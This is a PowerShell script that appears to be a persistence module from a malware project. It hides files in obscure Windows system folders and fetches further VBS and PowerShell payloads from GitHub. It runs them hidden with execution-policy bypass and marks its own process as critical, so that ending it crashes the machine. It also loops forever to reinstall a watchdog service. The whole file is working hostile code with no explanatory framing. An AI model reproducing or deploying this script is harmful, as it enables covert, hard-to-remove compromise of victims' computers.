param(
    [string]$rootPath,
    [string]$basePath,
    [string]$childServiceName,
    [string]$childServicePropertyName
)
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]

$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642"
)

if($basePath -eq "" -or $childServiceName -eq "" -or $childServicePropertyName -eq ""){
    $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $pa = "$pa\async_fun.vbs"
    iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
    wscript.exe $pa
}

Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami.txt`""
$b = $basePath -replace '([\\{}])', '`$1'


$signature = @"
using System;
using System.Runtime.InteropServices;

public class CS {
    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
"@
Add-Type -TypeDefinition $signature
[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null



$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$childServiceName"
$issetup = $false

$initChildServicePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initChildServicePath = "$initChildServicePath\init_service_rootmon.ps1"
$childPath = ""




$item = Get-ItemProperty -Path "$basePath" -Name $childServicePropertyName -ErrorAction SilentlyContinue
if(-not($item)){
    $childPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $childPath = "$childPath\root_mon.ps1" 
    New-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $childPath -Force | Out-Null
    $issetup = $true
}

else{
    $childPath = $item.$childServicePropertyName
    $issetup = $false
}



if(($rootPath -eq $null) -or ($rootPath -eq "")){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
}

function Get-ServiceReg{
    param([string]$path)
    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Get-ServiceName{
    param([string]$name)
    try {
        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}


while($true){
    $r = Get-ServiceReg -path $regPath
    $n = Get-ServiceName -name $childServiceName

    if(-not(Test-Path -Path $childPath -PathType Leaf)){
        if(-not($issetup)){
            $initChildServicePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $initChildServicePath = "$initChildServicePath\init_service_rootmon.ps1"
            $childPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $childPath = "$childPath\root_mon.ps1"
            Set-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $childPath -Force | Out-Null
        }
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $childPath
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initChildServicePath
        powershell.exe -ep bypass -noP -w hidden $initChildServicePath -rootPath $rootPath -scriptPath $childPath -basePath "$b"
    }
    
    elseif($r -or $n){
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initChildServicePath
        powershell.exe -ep bypass -noP -w hidden $initChildServicePath -rootPath $rootPath -scriptPath $childPath -basePath "$b"
    }
    $issetup = $false
}